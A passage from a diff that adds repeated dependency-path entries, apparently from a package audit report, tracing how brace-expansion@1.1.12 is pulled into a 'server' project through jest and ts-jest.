+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-resolve-dependencies@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-resolve-dependencies@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > jest@29.7.0 > jest-cli@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
